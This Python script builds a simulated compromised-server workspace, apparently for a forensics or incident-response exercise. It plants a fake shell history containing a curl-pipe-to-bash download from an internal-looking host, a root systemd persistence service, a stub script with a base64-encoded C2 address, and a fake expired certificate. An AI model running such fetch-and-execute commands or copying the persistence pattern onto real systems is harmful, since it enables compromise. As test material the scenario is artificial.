import os
import base64

def setup_environment():
    base_path = "assets/data_80"
    workspace = os.path.join(base_path, "workspace")
    os.makedirs(workspace, exist_ok=True)

    # 1. 伪造混淆的系统日志和历史记录
    bash_history = os.path.join(workspace, ".bash_history")
    with open(bash_history, "w") as f:
        f.write("ls -la\n")
        f.write("cd /tmp\n")
        f.write("curl -s http://dev-internal.net/setup.sh | bash\n") # 关键线索
        f.write("rm -rf setup.sh\n")
        f.write("systemctl status sys-diag.service\n")

    # 2. 伪造一个恶意的 Systemd 服务文件
    systemd_dir = os.path.join(workspace, "etc/systemd/system")
    os.makedirs(systemd_dir, exist_ok=True)
    with open(os.path.join(systemd_dir, "sys-diag.service"), "w") as f:
        f.write("[Unit]\nDescription=System Diagnostic Tool\nAfter=network.target\n\n")
        f.write("[Service]\nExecStart=/usr/local/bin/sys-diag\nRestart=always\nUser=root\n\n")
        f.write("[Install]\nWantedBy=multi-user.target\n")

    # 3. 伪造恶意二进制文件 (实际上是一个混淆过的 Python 脚本)
    # 该文件包含硬编码的 C2 地址: 192.168.50.201:8888
    bin_path = os.path.join(workspace, "usr/local/bin")
    os.makedirs(bin_path, exist_ok=True)
    
    malicious_code = """
import base64, socket
def connect():
    c2 = base64.b64decode("MTkyLjE2OC41MC4yMDE6ODg4OA==").decode()
    # Simulated beaconing...
    pass
if __name__ == "__main__":
    connect()
"""
    with open(os.path.join(bin_path, "sys-diag"), "w") as f:
        f.write("#!/usr/bin/python3\n")
        f.write(malicious_code)
    os.chmod(os.path.join(bin_path, "sys-diag"), 0o755)

    # 4. 伪造受损的证书存储 (Vulnerability)
    cert_dir = os.path.join(workspace, "etc/ssl/certs")
    os.makedirs(cert_dir, exist_ok=True)
    with open(os.path.join(cert_dir, "internal-dev-ca.crt"), "w") as f:
        f.write("-----BEGIN CERTIFICATE-----\n")
        f.write("MIICPDCCAaSgAwIBAgIQAJ7939102391023...EXPIRED_AND_VULNERABLE...\n")
        f.write("-----END CERTIFICATE-----\n")

    # 5. 创建初始说明文件
    with open(os.path.join(workspace, "README.txt"), "w") as f:
        f.write("Production Server srv-prod-042 - Integrity Check Environment\n")

if __name__ == "__main__":
    setup_environment()
